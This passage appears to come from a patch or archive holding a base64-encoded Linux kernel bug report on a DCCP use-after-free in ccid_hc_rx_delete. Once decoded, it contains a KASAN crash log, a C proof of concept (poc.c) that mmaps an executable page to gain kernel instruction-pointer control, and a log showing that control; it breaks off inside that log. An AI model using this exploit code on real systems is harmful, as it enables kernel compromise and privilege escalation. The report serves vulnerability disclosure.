+MDAwMDAwMDAwMDAwMDYgUjExOiAwMDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAw
+MDAwMDAwMDQwMThiMApbICAgODQuOTM2Njc4XSBSMTM6IDAwMDAwMDAwMDA0
+MDE5NDAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAwMDAwMDAwMDAw
+MDAwMApbICAgODQuOTM3NDAyXQpbICAgODQuOTM3NTc5XSBBbGxvY2F0ZWQg
+YnkgdGFzayAyNjk2OgpbICAgODQuOTM3OTY5XSAgc2F2ZV9zdGFja190cmFj
+ZSsweDE2LzB4MjAKWyAgIDg0LjkzODM4Nl0gIHNhdmVfc3RhY2srMHg0Ni8w
+eGQwClsgICA4NC45Mzg3NjddICBrYXNhbl9rbWFsbG9jKzB4YWQvMHhlMApb
+ICAgODQuOTM5MTM4XSAga2FzYW5fc2xhYl9hbGxvYysweDEyLzB4MjAKWyAg
+IDg0LjkzOTUzOF0gIGttZW1fY2FjaGVfYWxsb2MrMHhiOS8weDI2MApbICAg
+ODQuOTM5OTEwXSAgY2NpZF9uZXcrMHhiMS8weDM1MApbICAgODQuOTQwMTkz
+XSAgZGNjcF9oZGxyX2NjaWQrMHgyNy8weDE0MApbICAgODQuOTQwNTI0XSAg
+X19kY2NwX2ZlYXRfYWN0aXZhdGUrMHgxNDcvMHgyZDAKWyAgIDg0Ljk0MDkw
+MF0gIGRjY3BfZmVhdF9hY3RpdmF0ZV92YWx1ZXMrMHg0MTcvMHg4YTAKWyAg
+IDg0Ljk0MTMxM10gIGRjY3BfcmN2X3N0YXRlX3Byb2Nlc3MrMHhkZGIvMHgx
+NTEwClsgICA4NC45NDE3MDhdICBkY2NwX3Y2X2RvX3JjdisweDIwMS8weDNl
+MApbICAgODQuOTQyMDU3XSAgX19yZWxlYXNlX3NvY2srMHgxMjcvMHgzNjAK
+WyAgIDg0Ljk0MjM4M10gIHJlbGVhc2Vfc29jaysweDU5LzB4MWUwClsgICA4
+NC45NDI2OTldICBfX2luZXRfc3RyZWFtX2Nvbm5lY3QrMHg1NjIvMHhiODAK
+WyAgIDg0Ljk0MzA3Ml0gIGluZXRfc3RyZWFtX2Nvbm5lY3QrMHg1OC8weGEw
+ClsgICA4NC45NDM0MTddICBTWVNDX2Nvbm5lY3QrMHgyM2UvMHgyZTAKWyAg
+IDg0Ljk0MzcyOF0gIFN5U19jb25uZWN0KzB4MjQvMHgzMApbICAgODQuOTQ0
+MDE1XSAgZW50cnlfU1lTQ0FMTF82NF9mYXN0cGF0aCsweDFjLzB4YjEKWyAg
+IDg0Ljk0NDQwMF0KWyAgIDg0Ljk0NDUzNl0gRnJlZWQgYnkgdGFzayAyNjk2
+OgpbICAgODQuOTQ0ODA0XSAgc2F2ZV9zdGFja190cmFjZSsweDE2LzB4MjAK
+WyAgIDg0Ljk0NTEzMV0gIHNhdmVfc3RhY2srMHg0Ni8weGQwClsgICA4NC45
+NDU0MTNdICBrYXNhbl9zbGFiX2ZyZWUrMHg3MC8weGMwClsgICA4NC45NDU3
+MjZdICBrbWVtX2NhY2hlX2ZyZWUrMHhhNi8weDJiMApbICAgODQuOTQ2MDU1
+XSAgY2NpZF9oY19yeF9kZWxldGUrMHhiZi8weDEwMApbICAgODQuOTQ2Mzk4
+XSAgZGNjcF9oZGxyX2NjaWQrMHhkMy8weDE0MApbICAgODQuOTQ2NzI4XSAg
+X19kY2NwX2ZlYXRfYWN0aXZhdGUrMHgxNDcvMHgyZDAKWyAgIDg0Ljk0NzEw
+NF0gIGRjY3BfZmVhdF9hY3RpdmF0ZV92YWx1ZXMrMHg0MTcvMHg4YTAKWyAg
+IDg0Ljk0NzUxNF0gIGRjY3BfY3JlYXRlX29wZW5yZXFfY2hpbGQrMHg0MDIv
+MHg1NTAKWyAgIDg0Ljk0NzkyOV0gIGRjY3BfdjZfcmVxdWVzdF9yZWN2X3Nv
+Y2srMHgxZjcvMHgxOWMwClsgICA4NC45NDgzNDhdICBkY2NwX2NoZWNrX3Jl
+cSsweDUzYi8weDg5MApbICAgODQuOTQ4Njg2XSAgZGNjcF92Nl9yY3YrMHg1
+MzAvMHgxOWUwClsgICA4NC45NDkwMDFdICBpcDZfaW5wdXRfZmluaXNoKzB4
+NDNkLzB4MTUzMApbICAgODQuOTQ5MzU3XSAgaXA2X2lucHV0KzB4ZDUvMHgz
+MzAKWyAgIDg0Ljk0OTY1MF0gIGlwNl9yY3ZfZmluaXNoKzB4MTEyLzB4NjQw
+ClsgICA4NC45NDk5ODVdICBpcHY2X3JjdisweDEwOTEvMHgxZWYwClsgICA4
+NC45NTAyODVdICBfX25ldGlmX3JlY2VpdmVfc2tiX2NvcmUrMHgxN2RhLzB4
+MmFhMApbICAgODQuOTUwNzAyXSAgX19uZXRpZl9yZWNlaXZlX3NrYisweDJj
+LzB4MWEwClsgICA4NC45NTEwNjJdICBwcm9jZXNzX2JhY2tsb2crMHhlMy8w
+eDY5MApbICAgODQuOTUxNDA1XSAgbmV0X3J4X2FjdGlvbisweDgwOC8weGVj
+MApbICAgODQuOTUxNzMwXSAgX19kb19zb2Z0aXJxKzB4MjEzLzB4OGI1Clsg
+ICA4NC45NTIwNDBdClsgICA4NC45NTIxNzZdIFRoZSBidWdneSBhZGRyZXNz
+IGJlbG9uZ3MgdG8gdGhlIG9iamVjdCBhdCBmZmZmODgwMDMyNWU3MDIwClsg
+ICA4NC45NTIxNzZdICB3aGljaCBiZWxvbmdzIHRvIHRoZSBjYWNoZSBjY2lk
+Ml9oY19yeF9zb2NrIG9mIHNpemUgMTIKWyAgIDg0Ljk1MzI0NV0gVGhlIGJ1
+Z2d5IGFkZHJlc3MgaXMgbG9jYXRlZCAwIGJ5dGVzIGluc2lkZSBvZgpbICAg
+ODQuOTUzMjQ1XSAgMTItYnl0ZSByZWdpb24gW2ZmZmY4ODAwMzI1ZTcwMjAs
+IGZmZmY4ODAwMzI1ZTcwMmMpClsgICA4NC45NTQyMDVdIFRoZSBidWdneSBh
+ZGRyZXNzIGJlbG9uZ3MgdG8gdGhlIHBhZ2U6ClsgICA4NC45NTQ2MTZdIHBh
+Z2U6ZmZmZmVhMDAwMGM5NzljMCBjb3VudDoxIG1hcGNvdW50OjAgbWFwcGlu
+ZzogICAgICAgICAgKG51bGwpIGluZGV4OjB4MApbICAgODQuOTU1Mjk1XSBm
+bGFnczogMHgxMDAwMDAwMDAwMDAxMDAoc2xhYikKWyAgIDg0Ljk1NTY1NV0g
+cmF3OiAwMTAwMDAwMDAwMDAwMTAwIDAwMDAwMDAwMDAwMDAwMDAgMDAwMDAw
+MDAwMDAwMDAwMCAwMDAwMDAwMTgwODAwMDgwClsgICA4NC45NTYyOTldIHJh
+dzogZGVhZDAwMDAwMDAwMDEwMCBkZWFkMDAwMDAwMDAwMjAwIGZmZmY4ODAw
+MzRhOGM4YzAgMDAwMDAwMDAwMDAwMDAwMApbICAgODQuOTU2OTU1XSBwYWdl
+IGR1bXBlZCBiZWNhdXNlOiBrYXNhbjogYmFkIGFjY2VzcyBkZXRlY3RlZApb
+ICAgODQuOTU3NDIxXQpbICAgODQuOTU3NTU1XSBNZW1vcnkgc3RhdGUgYXJv
+dW5kIHRoZSBidWdneSBhZGRyZXNzOgpbICAgODQuOTU3OTYxXSAgZmZmZjg4
+MDAzMjVlNmYwMDogZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIgZmIg
+ZmIgZmIgZmIgZmIgZmIKWyAgIDg0Ljk1ODU3MV0gIGZmZmY4ODAwMzI1ZTZm
+ODA6IGZiIGZiIGZiIGZiIGZiIGZiIGZiIGZjIGZjIGZjIGZjIGZjIGZjIGZj
+IGZjIGZjClsgICA4NC45NTkxNzVdID5mZmZmODgwMDMyNWU3MDAwOiBmYiBm
+YiBmYyBmYyBmYiBmYiBmYyBmYyBmYiBmYiBmYyBmYyAwMCAwNCBmYyBmYwpb
+ICAgODQuOTU5NzgwXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+XgpbICAgODQuOTYwMTQ1XSAgZmZmZjg4MDAzMjVlNzA4MDogZmIgZmIgZmMg
+ZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMKWyAgIDg0
+Ljk2MDc1M10gIGZmZmY4ODAwMzI1ZTcxMDA6IGZjIGZjIGZjIGZjIGZjIGZj
+IGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjClsgICA4NC45NjEzNjNd
+ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+PT09PT09PT09PT09PT09PT09PT09PQpbICAgODQuOTYxOTg1XSBCVUc6IHVu
+YWJsZSB0byBoYW5kbGUga2VybmVsIE5VTEwgcG9pbnRlciBkZXJlZmVyZW5j
+ZSBhdCAwMDAwMDAwMDAwMDAwMDA5ClsgICA4NC45NjI2MzldIElQOiBrbWVt
+X2NhY2hlX2ZyZWUrMHgxMC8weDJiMApbICAgODQuOTYyOTgwXSBQR0QgMmVm
+YWUwNjcKWyAgIDg0Ljk2Mjk4Ml0gUDREIDJlZmFlMDY3ClsgICA4NC45NjMy
+MDNdIFBVRCAyZWY3YjA2NwpbICAgODQuOTYzNDI5XSBQTUQgMApbICAgODQu
+OTYzNjUyXQpbICAgODQuOTYzOTYwXSBPb3BzOiAwMDAwIFsjMV0gU01QIEtB
+U0FOClsgICA4NC45NjQyNjddIE1vZHVsZXMgbGlua2VkIGluOgpbICAgODQu
+OTY0NTM0XSBDUFU6IDAgUElEOiAyNjk2IENvbW06IGRjY3AgVGFpbnRlZDog
+RyAgICBCICAgICAgICAgICA0LjEyLjAtcmMzKyAjMgpbICAgODQuOTY1MTQ2
+XSBIYXJkd2FyZSBuYW1lOiBRRU1VIFN0YW5kYXJkIFBDIChpNDQwRlggKyBQ
+SUlYLCAxOTk2KSwgQklPUyBVYnVudHUtMS44LjItMXVidW50dTEgMDQvMDEv
+MjAxNApbICAgODQuOTY1OTI4XSB0YXNrOiBmZmZmODgwMDMxYmI4MDAwIHRh
+c2suc3RhY2s6IGZmZmY4ODAwMzFhNDgwMDAKWyAgIDg0Ljk2NjQyNV0gUklQ
+OiAwMDEwOmttZW1fY2FjaGVfZnJlZSsweDEwLzB4MmIwClsgICA4NC45NjY4
+MTNdIFJTUDogMDAxODpmZmZmODgwMDMxYTRmYzQwIEVGTEFHUzogMDAwMTAy
+OTYKWyAgIDg0Ljk2NzI0Nl0gUkFYOiAwMDAwMDAwMDAwMDAwMDAxIFJCWDog
+ZmZmZjg4MDAzMjVlNzAyMCBSQ1g6IGZmZmZmZmZmOGFmY2ZlY2YKWyAgIDg0
+Ljk2NzgxMl0gUkRYOiAwMDAwMDAwMDAwMDAwMDAwIFJTSTogZmZmZjg4MDAz
+MjVlNzAyMCBSREk6IDAwMDAwMDAwMDAwMDAwMDAKWyAgIDg0Ljk2ODI3N10g
+UkJQOiBmZmZmODgwMDMxYTRmYzY4IFIwODogMDAwMDAwMDAwMDAwMDAwMSBS
+MDk6IDAwMDAwMDAwMDAwMDAwMDEKWyAgIDg0Ljk2ODc0M10gUjEwOiAwMDAw
+MDAwMDAwMDAwMDAwIFIxMTogMDAwMDAwMDAwMDAwMDAwMCBSMTI6IDAwMDAw
+MDAwMDAwMDAwMDAKWyAgIDg0Ljk2OTIwOV0gUjEzOiAwMDAwMDAwMDAwMDAw
+MDAwIFIxNDogZmZmZjg4MDAzMjcwOWM4MCBSMTU6IDAwMDAwMDAwMDAwMDAw
+MDcKWyAgIDg0Ljk2OTY3Nl0gRlM6ICAwMDAwMDAwMDAwYjNjODgwKDAwMDAp
+IEdTOmZmZmY4ODAwMzVlMDAwMDAoMDAwMCkga25sR1M6MDAwMDAwMDAwMDAw
+MDAwMApbICAgODQuOTcwMzc2XSBDUzogIDAwMTAgRFM6IDAwMDAgRVM6IDAw
+MDAgQ1IwOiAwMDAwMDAwMDgwMDUwMDMzClsgICA4NC45NzA4OTBdIENSMjog
+MDAwMDAwMDAwMDAwMDAwOSBDUjM6IDAwMDAwMDAwMmVmM2MwMDAgQ1I0OiAw
+MDAwMDAwMDAwMDAwNmYwClsgICA4NC45NzE0OTddIERSMDogMDAwMDAwMDAw
+MDAwMDAwMCBEUjE6IDAwMDAwMDAwMDAwMDAwMDAgRFIyOiAwMDAwMDAwMDAw
+MDAwMDAwClsgICA4NC45NzIwOTFdIERSMzogMDAwMDAwMDAwMDAwMDAwMCBE
+UjY6IDAwMDAwMDAwZmZmZTBmZjAgRFI3OiAwMDAwMDAwMDAwMDAwNDAwClsg
+ICA4NC45NzI2ODldIENhbGwgVHJhY2U6ClsgICA4NC45NzI5MDZdICBjY2lk
+X2hjX3J4X2RlbGV0ZSsweGJmLzB4MTAwClsgICA4NC45NzMyNDddICBkY2Nw
+X2Rlc3Ryb3lfc29jaysweDFhNy8weDJiMApbICAgODQuOTczNTk2XSAgZGNj
+cF92Nl9kZXN0cm95X3NvY2srMHgxNS8weDIwClsgICA4NC45NzM5NDZdICBp
+bmV0X2Nza19kZXN0cm95X3NvY2srMHgxNjYvMHg0MDAKWyAgIDg0Ljk3NDMx
+OV0gIGRjY3BfY2xvc2UrMHgzZGUvMHhjNDAKWyAgIDg0Ljk3NDYyN10gID8g
+X19mc25vdGlmeV91cGRhdGVfY2hpbGRfZGVudHJ5X2ZsYWdzLnBhcnQuMisw
+eDJjMC8weDJjMApbICAgODQuOTc1MTY4XSAgPyBpcF9tY19kcm9wX3NvY2tl
+dCsweDFkZC8weDI1MApbICAgODQuOTc1NTI2XSAgPyBzb2NrX3JlbGVhc2Ur
+MHgyMDAvMHgyMDAKWyAgIDg0Ljk3NTg0NF0gIGluZXRfcmVsZWFzZSsweGVk
+LzB4MWMwClsgICA4NC45NzYxNDRdICBpbmV0Nl9yZWxlYXNlKzB4NTAvMHg3
+MApbICAgODQuOTc2NDQ2XSAgc29ja19yZWxlYXNlKzB4OGQvMHgyMDAKWyAg
+IDg0Ljk3Njc0N10gIHNvY2tfY2xvc2UrMHgxNi8weDIwClsgICA4NC45Nzcw
+MjFdICBfX2ZwdXQrMHgyODkvMHg2ZjAKWyAgIDg0Ljk3NzI4NV0gIF9fX19m
+cHV0KzB4MTUvMHgyMApbICAgODQuOTc3NTUzXSAgdGFza193b3JrX3J1bisw
+eGY5LzB4MTcwClsgICA4NC45Nzc4NjFdICBleGl0X3RvX3VzZXJtb2RlX2xv
+b3ArMHgxM2IvMHgxNjAKWyAgIDg0Ljk3ODIzNV0gIHN5c2NhbGxfcmV0dXJu
+X3Nsb3dwYXRoKzB4MTZiLzB4MWEwClsgICA4NC45Nzg2MTldICBlbnRyeV9T
+WVNDQUxMXzY0X2Zhc3RwYXRoKzB4YWYvMHhiMQpbICAgODQuOTc5MDA3XSBS
+SVA6IDAwMzM6MHg0M2ZhODAKWyAgIDg0Ljk3OTI2NF0gUlNQOiAwMDJiOjAw
+MDA3ZmZkMzU4MTgwYzggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAw
+MDAwMDAwMDAwMDAwMwpbICAgODQuOTc5ODgwXSBSQVg6IDAwMDAwMDAwMDAw
+MDAwMDAgUkJYOiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQz
+ZmE4MApbICAgODQuOTgwNDY4XSBSRFg6IDAwMDAwMDAwMDA2Y2Q1ZDAgUlNJ
+OiAwMDAwMDAwMDAwMDAwMDBhIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAg
+ODQuOTgxMDQxXSBSQlA6IDAwMDA3ZmZkMzU4MTg2YzAgUjA4OiAwMDAwMDAw
+MDAwNmNkNWMwIFIwOTogMDAwMDAwMDAwMGIzYzg4MApbICAgODQuOTgxNjEz
+XSBSMTA6IDAwMDAwMDAwMDAwMDAwMDYgUjExOiAwMDAwMDAwMDAwMDAwMjQ2
+IFIxMjogMDAwMDAwMDAwMDQwMThiMApbICAgODQuOTgyMTg3XSBSMTM6IDAw
+MDAwMDAwMDA0MDE5NDAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAw
+MDAwMDAwMDAwMDAwMApbICAgODQuOTgyNzY4XSBDb2RlOiBjMCAwZiA4NSA3
+NCBmZiBmZiBmZiAwZiBmZiBlOSA2ZCBmZiBmZiBmZiAwZiAxZiAwMCA2NiAy
+ZSAwZiAxZiA4NCAwMCAwMCAwMCAwMCAwMCA1NSA0OCA4OSBlNSA0MSA1NyA0
+MSA1NiA0MSA1NSA0MSA1NCA0OSA4OSBmYyA1MyA8ZjY+IDQ3IDA5IDAxIDBm
+IDg1IGM0IDAxIDAwIDAwIDRkIDg1IGU0IDBmIDg0IDAyIDAxIDAwIDAwIGJh
+IDAwClsgICA4NC45ODQzMzVdIFJJUDoga21lbV9jYWNoZV9mcmVlKzB4MTAv
+MHgyYjAgUlNQOiBmZmZmODgwMDMxYTRmYzQwClsgICA4NC45ODQ4MjVdIENS
+MjogMDAwMDAwMDAwMDAwMDAwOQpbICAgODQuOTg1MTAyXSAtLS1bIGVuZCB0
+cmFjZSAzMWU2OGM4MWY0OTVlMTc0IF0tLS0KWyAgIDg0Ljk4NTQ3N10gS2Vy
+bmVsIHBhbmljIC0gbm90IHN5bmNpbmc6IEZhdGFsIGV4Y2VwdGlvbiBpbiBp
+bnRlcnJ1cHQKWyAgIDg0Ljk4NjIzMF0gS2VybmVsIE9mZnNldDogMHg4MDAw
+MDAwIGZyb20gMHhmZmZmZmZmZjgxMDAwMDAwIChyZWxvY2F0aW9uIHJhbmdl
+OiAweGZmZmZmZmZmODAwMDAwMDAtMHhmZmZmZmZmZmJmZmZmZmYK
+
+--f403043b2478f365ad055f8cadf0
+Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
+Content-Disposition: attachment; filename="poc.c"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jasv7iux1
+
+LypUaGlzIHBvYyBoYXMgYmVlbiB0ZXN0ZWQgb24gbXkgY3VzdG9tIGtlcm5l
+bCByZXNlYWNoIGluIHVidW50dSA0LjEwLjUsIHRoZSBzYW1lIHRoaW5nIGFw
+cGxpZXMgdG8gb3RoZXIgdmVyc2lvbnMKICogaWYgeW91IGRvbid0IHNlZSBS
+SVAgY29udHJvbCwgdGhhdCBtZWFucyBmaWxlX3NlY3VyaXR5X2FsbG9jIGlz
+IG5vdCBjYWxsZWQsIHNvIHdlIHNob3VsZCBsb29rIGZvciBvdGhlciBzaW1p
+bGFyIG9iamVjdAogKiAqLwojZGVmaW5lIF9HTlVfU09VUkNFCiNpbmNsdWRl
+IDxzdGRpby5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzdGRs
+aWIuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3Nv
+Y2tldC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1ZGUgPG5l
+dGluZXQvaW4uaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8cHRo
+cmVhZC5oPgojaW5jbHVkZSA8c3lzL21tYW4uaD4KCgppbnQgZmQxLGZkMjsK
+c3RydWN0IHNvY2thZGRyX2luNiBpbjEsaW4yOwoKaW50IGRvX3VhZigpCnsK
+ICAgIHN0cnVjdCBzb2NrYWRkcl9pbjYgY2luMSxjaW4yOwoKICAgIGZkMSA9
+IHNvY2tldCgweGEsNiwwKTsKCiAgICBtZW1zZXQoJmluMSwwLHNpemVvZihp
+bjEpKTsKICAgIGluMS5zaW42X2ZhbWlseSA9IEFGX0lORVQ2OwogICAgaW4x
+LnNpbjZfYWRkciA9IGluNmFkZHJfbG9vcGJhY2s7CiAgICBpbjEuc2luNl9w
+b3J0ID0gMHgyMTRlOy8vaHRvbnMoMHgxMDAwKTsKICAgIGJpbmQoZmQxLChz
+dHJ1Y3Qgc29ja2FkZHIqKSZpbjEsc2l6ZW9mKGluMSkpOwoKICAgIGxpc3Rl
+bihmZDEsMHgxKTsKCiAgICBmZDIgPSBzb2NrZXQoMHhhLDYsMCk7CgogICAg
+bWVtc2V0KCZjaW4xLDAsc2l6ZW9mKGNpbjEpKTsKICAgIGNpbjEuc2luNl9m
+YW1pbHkgPSBBRl9JTkVUNjsKICAgIGNpbjEuc2luNl9hZGRyID0gaW42YWRk
+cl9sb29wYmFjazsKICAgIGNpbjEuc2luNl9wb3J0ID0gMHgyMTRlOy8vaHRv
+bnMoMHgxMDAwKTsKICAgIGNpbjEuc2luNl9mbG93aW5mbyA9IDA7CiAgICBj
+b25uZWN0KGZkMiwoc3RydWN0IHNvY2thZGRyKikmY2luMSxzaXplb2YoY2lu
+MSkpOwoKICAgIG1lbXNldCgmY2luMiwwLHNpemVvZihjaW4yKSk7CiAgICBj
+b25uZWN0KGZkMSwoc3RydWN0IHNvY2thZGRyKikmY2luMixzaXplb2YoY2lu
+MikpOwogICAgbWVtc2V0KCZpbjIsMCxzaXplb2YoaW4yKSk7CgogICAgaW4y
+LnNpbjZfZmFtaWx5ID0gQUZfSU5FVDY7CiAgICBpbjIuc2luNl9hZGRyID0g
+aW42YWRkcl9sb29wYmFjazsKICAgIGluMi5zaW42X3BvcnQgPSBodG9ucygw
+eDIwMDApOwogICAgaW4yLnNpbjZfZmxvd2luZm8gPSAweDI7CiAgICBpbjIu
+c2luNl9zY29wZV9pZCA9IDY7CiAgICBiaW5kKGZkMiwoc3RydWN0IHNvY2th
+ZGRyKikmaW4yLHNpemVvZihpbjIpKTsKCiAgICBzdHJ1Y3Qgc29ja2FkZHJf
+aW42IGNpbjM7CiAgICBtZW1zZXQoJmNpbjMsMCxzaXplb2YoY2luMykpOwog
+ICAgY29ubmVjdChmZDIsKHN0cnVjdCBzb2NrYWRkciopJmNpbjMsc2l6ZW9m
+KGNpbjMpKTsKCiAgICBsaXN0ZW4oZmQyLDB4YjEpOwoKICAgIHN0cnVjdCBz
+b2NrYWRkcl9pbjYgY2luNDsKICAgIG1lbXNldCgmY2luNCwwLHNpemVvZihj
+aW40KSk7CiAgICBjaW40LnNpbjZfZmFtaWx5ID0gQUZfSU5FVDY7CiAgICBj
+aW40LnNpbjZfcG9ydCA9IGh0b25zKDB4MjAwMCk7Ly9odG9ucygweDMwMDAp
+OwogICAgbWVtc2V0KCZjaW40LnNpbjZfYWRkciwwLHNpemVvZihzdHJ1Y3Qg
+aW42X2FkZHIpKTsKICAgIGNpbjQuc2luNl9mbG93aW5mbyA9IDE7CiAgICBj
+aW40LnNpbjZfc2NvcGVfaWQgPSAweDMyZjE7CiAgICBjb25uZWN0KGZkMSwo
+c3RydWN0IHNvY2thZGRyKikmY2luNCxzaXplb2YoY2luNCkpOwogICAgcmV0
+dXJuIGZkMjsKfQoKdm9pZCAqIGFsbG9jX3VtZW0odm9pZCAqYWRkcixzaXpl
+X3Qgc2l6ZSkKewoKICAgIGFkZHIgPSBtbWFwKCh2b2lkKikweDEwMDAwMDAw
+MCw0MDk2LFBST1RfUkVBRCB8IFBST1RfV1JJVEUgfCBQUk9UX0VYRUMsTUFQ
+X1NIQVJFRHxNQVBfQU5PTllNT1VTLC0xLDApOwogICAgaWYoYWRkciA9PSAo
+Y2hhciAqKS0xKSB7CiAgICAgICAgcGVycm9yKCJtbWFwIik7CiAgICAgICAg
+cmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gYWRkcjsKfQppbnQgbWFp
+bih2b2lkKQp7CiAgICBjaGFyICphZGRyOwoKICAgIGFkZHIgPSAoY2hhciAq
+KWFsbG9jX3VtZW0oKHZvaWQqKTB4MTAwMDAwMDAwLDQwOTYpOwogICAgaWYo
+YWRkciA9PSBOVUxMKQogICAgICAgIGV4aXQoMCk7CiAgICBtZW1zZXQoYWRk
+ciwweGNjLDQwOTYpOwogICAgKih1bnNpZ25lZCBsb25nICopKGFkZHIgKyAw
+eDc5KSA9IDB4ZGVhZGJlZWY7IC8qIFJJUCBjb250cm9sICovCgogICAgZG9f
+dWFmKCk7CiAgICBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsKICAg
+IGNsb3NlKGZkMik7CiAgICByZXR1cm4gMDsKfQo=
+
+--f403043b2478f365ad055f8cadf0
+Content-Type: application/octet-stream; name="rip.log"
+Content-Disposition: attachment; filename="rip.log"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_jasv7iv42
+
+WyAgIDMzLjI1NjEwNV0gQlVHOiB1bmFibGUgdG8gaGFuZGxlIGtlcm5lbCBw
+YWdpbmcgcmVxdWVzdCBhdCAwMDAwMDAwMGRlYWRiZWVmClsgICAzMy4yNTcw
+MzhdIElQOiAweGRlYWRiZWVmClsgICAzMy4yNTcwMzhdIFBHRCAzZDViYTA2
+NwpbICAgMzMuMjU3MDM4XSBQVUQgMApbICAgMzMuMjU3MDM4XQpbICAgMzMu
+MjU3MDM4XSBPb3BzOiAwMDEwIFsjMV0gU01QClsgICAzMy4yNTcwMzhdIE1v
+ZHVsZXMgbGlua2VkIGluOgpbICAgMzMuMjU3MDM4XSBDUFU6IDAgUElEOiAy
+NTIyIENvbW06IGRjY3AgTm90IHRhaW50ZWQgNC4xMC41ICMxClsgICAzMy4y
+NTcwMzhdIEhhcmR3YXJlIG5hbWU6IFFFTVUgU3RhbmRhcmQgUEMgKGk0NDBG
+WCArIFBJSVgsIDE5OTYpLCBCSU9TIFVidW50dS0xLjguMi0xdWJ1bnR1MSAw
+NC8wMS8yMDE0ClsgICAzMy4yNTcwMzhdIHRhc2s6IGZmZmY4ODAwM2Q2MWFm
+MDAgdGFzay5zdGFjazogZmZmZmM5MDAwMWNlYzAwMApbICAgMzMuMjU3MDM4
+XSBSSVA6IDAwMTA6MHhkZWFkYmVlZgpbICAgMzMuMjU3MDM4XSBSU1A6IDAw
+MTg6ZmZmZmM5MDAwMWNlZmQ2OCBFRkxBR1M6IDAwMDEwMjAyClsgICAzMy4y
+NTcwMzhdIFJBWDogMDAwMDAwMDEwMDAwMDAwMSBSQlg6IGZmZmY4ODAwM2Q2
+NTEyNzAgUkNYOiAwMDAwMDAwMDAwMDAwMDA3ClsgICAzMy4yNTcwMzhdIFJE
+WDogMDAwMDAwMDBkZWFkYmVlZiBSU0k6IGZmZmY4ODAwM2Q3MTBlODAgUkRJ
+OiBmZmZmODgwMDNkNzEwZTgwClsgICAzMy4yNTcwMzhdIFJCUDogZmZmZmM5
+MDAwMWNlZmQ3OCBSMDg6IDAwMDAwMDAwMDAwMWZkZDAgUjA5OiBmZmZmZmZm
+ZjgxODZmMGQxClsgICAzMy4yNTcwMzhdIFIxMDogZmZmZjg4MDAzZDg5MjIw
+MCBSMTE6IDAwMDAwMDAwMDAwMDAwMDEgUjEyOiBmZmZmODgwMDNkNzExMGEw
+ClsgICAzMy4yNTcwMzhdIFIxMzogMDAwMDAwMDAwMDAwMDAwNyBSMTQ6IGZm
+ZmY4ODAwM2UyMjdhYTAgUjE1OiBmZmZmODgwMDNkMTkxMGMwClsgICAzMy4y
+NTcwMzhdIEZTOiAgMDAwMDAwMDAwMWRlOTg4MCgwMDAwKSBHUzpmZmZmODgw
+MDNmYzAwMDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgIDMz
+LjI1NzAzOF0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAw
+MDAwMDA4MDA1MDAzMwpbICAgMzMuMjU3MDM4XSBDUjI6IDAwMDAwMDAwZGVh
+ZGJlZWYgQ1IzOiAwMDAwMDAwMDNjYWFkMDAwIENSNDogMDAwMDAwMDAwMDAw
+MDZmMApbICAgMzMuMjU3MDM4XSBEUjA6IDAwMDAwMDAwMDAwMDAwMDAgRFIx
+OiAwMDAwMDAwMDAwMDAwMDAwIERSMjogMDAwMDAwMDAwMDAwMDAwMApbICAg
+MzMuMjU3MDM4XSBEUjM6IDAwMDAwMDAwMDAwMDAwMDAgRFI2OiAwMDAwMDAw
+MGZmZmUwZmYwIERSNzogMDAwMDAwMDAwMDAwMDQwMApbICAgMzMuMjU3MDM4
+XSBDYWxsIFRyYWNlOgpbICAgMzMuMjU3MDM4XSAgPyBjY2lkX2hjX3J4X2Rl
+bGV0ZSsweDFlLzB4NDAKWyAgIDMzLjI1NzAzOF0gIGRjY3BfZGVzdHJveV9z
+b2NrKzB4NzgvMHhiMApbICAgMzMuMjU3MDM4XSAgZGNjcF92Nl9kZXN0cm95
+X3NvY2srMHhkLzB4MjAKWyAgIDMzLjI1NzAzOF0gIGluZXRfY3NrX2Rlc3Ry
+b3lfc29jaysweDQ2LzB4MTYwClsgICAzMy4yNTcwMzhdICBkY2NwX2Nsb3Nl
+KzB4MTJmLzB4MzUwClsgICAzMy4yNTcwMzhdICBpbmV0X3JlbGVhc2UrMHgz
+Ny8weDYwClsgICAzMy4yNTcwMzhdICBpbmV0Nl9yZWxlYXNlKzB4MmIvMHg0
+MApbICAgMzMuMjU3MDM4XSAgc29ja19yZWxlYXNlKzB4MWEvMHg3MApbICAg
+MzMuMjU3MDM4XSAgc29ja19jbG9zZSsweGQvMHgyMApbICAgMzMuMjU3MDM4
+XSAgX19mcHV0KzB4ZGEvMHgxZTAKWyAgIDMzLjI1NzAzOF0gIF9fX19mcHV0
+KzB4OS8weDEwClsgICAzMy4yNTcwMzhdICB0YXNrX3dvcmtfcnVuKzB4Nzkv
+MHhhMApbICAgMzMuMjU3MDM4XSAgZXhpdF90b191c2VybW9kZV9sb29wKzB4
+NmYvMHg4MApbICAgMzMuMjU3MDM4XSAgc3lzY2FsbF9yZXR1cm5fc2xvd3Bh
